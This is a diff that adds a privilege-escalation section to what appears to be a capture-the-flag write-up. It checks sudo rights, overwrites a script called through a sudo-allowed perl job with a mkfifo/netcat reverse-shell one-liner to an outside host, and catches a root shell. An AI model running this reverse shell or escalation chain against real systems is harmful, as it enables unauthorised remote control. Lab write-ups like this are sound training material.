@@ -127,3 +127,45 @@ nc -lvnp 4444
 5. Triggered shell → Connected as `www-data`
 
 ---
+
+## 🧑‍💻 Privilege Escalation
+
+Checked sudo rights:
+
+```bash
+sudo -l
+```
+
+Allowed to run:
+
+```
+/usr/bin/perl /home/itguy/backup.pl
+```
+
+Content of `backup.pl`:
+
+```perl
+system("/etc/copy.sh");
+```
+
+Overwrote `/etc/copy.sh` with a reverse shell:
+
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc <your-ip> 5554 > /tmp/f" > /etc/copy.sh
+```
+
+Started listener:
+
+```bash
+nc -lvnp 5554
+```
+
+Executed:
+
+```bash
+sudo /usr/bin/perl /home/itguy/backup.pl
+```
+
+Gained root shell.
+
+---
